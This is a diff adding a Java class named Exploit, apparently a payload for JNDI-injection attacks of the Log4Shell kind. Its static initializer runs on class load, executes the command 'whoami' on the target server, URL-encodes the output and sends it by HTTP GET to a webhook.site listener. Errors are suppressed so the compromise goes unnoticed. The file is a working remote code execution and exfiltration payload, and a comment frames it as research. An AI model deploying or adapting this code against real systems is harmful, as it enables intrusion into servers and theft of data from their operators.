@@ -1,0 +1,39 @@
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.Hashtable;
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+
+public class Exploit implements ObjectFactory {
+
+    static {
+        try {
+            // 1. Execute the command
+            Process p = Runtime.getRuntime().exec("whoami");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String user = reader.readLine(); // Get the username (e.g., 'nt authority\system')
+
+            // 2. Prepare the data for transport (URL encoding handles spaces/special chars)
+            String encodedUser = URLEncoder.encode(user, "UTF-8");
+            String webhookUrl = "https://webhook.site/8c7d8182-9780-4466-9fa0-9cc0402861ca?result=" + encodedUser;
+
+            // 3. Send the GET request to the researcher's listener
+            URL url = new URL(webhookUrl);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.getInputStream().read(); // Triggers the connection
+            
+        } catch (Exception e) {
+            // In research, we fail silently to keep the target service running
+        }
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        return null; 
+    }
+}
